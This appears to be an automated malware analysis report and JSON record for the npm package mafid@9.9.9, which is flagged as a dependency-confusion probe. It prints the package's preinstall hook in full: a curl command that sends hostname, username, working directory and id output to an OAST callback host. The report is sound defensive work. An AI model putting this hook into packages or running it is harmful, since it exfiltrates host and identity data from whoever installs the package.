# npm mafid@9.9.9

**Source:** datadog · **Source label:** malicious · **Released:** 2024-12-21 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package contains only a `package.json`. Its `preinstall` hook runs `/usr/bin/curl --data-urlencode "info=$(hostname && whoami && pwd && id)"` against an OAST callback host (ctjds0iau37sgcqd1uq0woyponn53348c.oast[.]online), sending host recon data over plain HTTP on every install. There are no gates: nothing checks the environment before the request runs. The payload only needs a POSIX shell, curl at `/usr/bin/curl`, and outbound HTTP to the callback host.

## Execution

- **preinstall** `/usr/bin/curl --data-urlencode  "info=$(hostname && whoami && pwd && id)" ctjds0iau37sgcqd1uq0woyponn53348c.oast[.]online`: no package files; inline_shell.

## Gates

None.

## Requirements

- installed_tool: curl (Hook calls /usr/bin/curl by absolute path to send the data.)
- file_present: /usr/bin/curl (The curl binary is invoked by absolute path, so it must live at /usr/bin/curl.)
- os: linux, darwin (POSIX shell command substitution plus hostname, whoami, pwd and id; would not work under cmd.exe on Windows.)
- network: ctjds0iau37sgcqd1uq0woyponn53348c[.]oast[.]online:80 (No scheme given, so curl uses plain HTTP to the OAST callback host to deliver the data.)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- The prefilled launch style `download_then_exec` was changed to `inline_shell`, because the curl response is never saved or run.
- The version 9.9.9 on an empty package with no description suggests a dependency-confusion probe. That label comes from the version number and package shape, not from any code.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "mafid",
    "version": "9.9.9",
    "archive_sha256": "3b1accc67feca4c8298506c75372805345e9385ca1baf761ee18fb8bb22cb644",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2024-12-21",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2024-12-21-mafid-v9.9.9.zip",
    "package_root": "layer0/tmp/tmplz_dyrva/mafid/package",
    "cluster_key": "2de2d057ca7f68ef931461ad6f193530c143bc3f72b25a23e6367ef9082aa462",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "/usr/bin/curl --data-urlencode  \"info=$(hostname && whoami && pwd && id)\" ctjds0iau37sgcqd1uq0woyponn53348c.oast[.]online",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "The package holds only package.json; the preinstall hook is the whole install path and was read in full. No JS files exist (main index.js is absent).",
      "Launch style changed from download_then_exec to inline_shell: curl only sends data (POST via --data-urlencode); the response is not saved or executed.",
      "The && chain inside $(...) is sequencing of recon commands, not an environment check; a failing command only truncates the collected data. Not a gate."
    ]
  },
  "requirements": [
    {
      "axis": "installed_tool",
      "value": "curl",
      "reason": "Hook calls /usr/bin/curl by absolute path to send the data."
    },
    {
      "axis": "file_present",
      "value": "/usr/bin/curl",
      "reason": "The curl binary is invoked by absolute path, so it must live at /usr/bin/curl."
    },
    {
      "axis": "os",
      "value": [
        "linux",
        "darwin"
      ],
      "reason": "POSIX shell command substitution plus hostname, whoami, pwd and id; would not work under cmd.exe on Windows."
    },
    {
      "axis": "network",
      "value": "ctjds0iau37sgcqd1uq0woyponn53348c[.]oast[.]online:80",
      "reason": "No scheme given, so curl uses plain HTTP to the OAST callback host to deliver the data."
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "ctjds0iau37sgcqd1uq0woyponn53348c.oast[.]online",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": "oast-callback recon",
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook unconditionally collects hostname, username, working directory and id output and posts it to an OAST (interactsh-style) callback host. The 9.9.9 version on an otherwise empty package fits a dependency-confusion probe.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
